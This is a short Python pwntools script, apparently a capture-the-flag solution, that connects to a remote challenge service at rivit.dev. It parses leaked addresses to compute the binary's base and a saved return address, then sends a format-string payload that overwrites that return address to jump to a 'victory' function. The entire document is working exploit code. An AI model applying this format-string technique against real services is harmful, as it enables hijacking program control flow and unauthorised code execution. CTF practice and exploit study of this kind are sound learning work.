from pwn import *

elf = context.binary = ELF('./task')
context.log_level = 'debug'
context.terminal = 'kitty'

p = remote('rivit.dev', 10016)
# p = process()
# p = gdb.debug('./task')

p.recvuntil('victory: ')
elf.address = int(p.recvline().decode().strip('\n'), 16) - elf.sym.victory
log.info("%#x", elf.address)
p.recvuntil('buf: ')
buf = int(p.recvline().decode().strip('\n'), 16)
ret = buf + 0x90
# log.info("%#x", ret)

payload = fmtstr_payload(7, {ret: elf.sym.victory})

p.sendline(payload)

print(p.recvall())
p.interactive()
